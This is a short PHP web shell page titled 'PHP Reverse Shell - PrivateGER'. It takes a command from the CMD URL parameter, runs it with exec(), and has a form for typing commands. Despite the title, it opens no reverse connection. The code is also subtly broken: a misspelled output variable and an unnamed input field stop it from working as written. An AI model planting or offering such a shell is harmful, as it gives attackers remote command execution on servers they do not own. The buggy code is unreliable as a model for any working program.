<?php
$CMD = $_GET["CMD"];
exec($CMD, $output, $retval);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>PHP Reverse Shell - PrivateGER</title>
</head>
<body>
<style>
body {
  background-color: black;
}

p {
  color: white;
}
</style>
<?php
echo "<p>";
foreach($ouput as $row) {
    echo $row.'<br>';
}
echo "</p>";
?>
<div style="margin-top: 55px"></div>
<form action="" method="GET">
<input type="text" placeholder="Enter command..." required>
<input type="submit">Execute</input>
</form>
<body>
</html>
